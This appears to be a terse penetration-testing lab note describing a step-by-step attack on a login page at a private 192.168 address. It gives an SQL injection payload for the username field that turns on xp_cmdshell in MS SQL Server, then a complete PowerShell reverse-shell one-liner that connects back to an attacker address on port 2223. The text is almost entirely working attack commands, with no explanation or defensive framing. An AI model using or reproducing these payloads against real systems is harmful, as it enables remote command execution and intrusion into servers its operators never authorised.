move this page
```
http://192.168.xxx.120/login.aspx
```

input SQLi in username form
```
' EXECUTE sp_configure 'show advanced options', 1; ' RECONFIGURE; ' EXECUTE sp_configure 'xp_cmdshell', 1; ' RECONFIGURE; -- -
```
then get the revshell
```
' EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(''192.168.45.172'',2223);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'-- -
```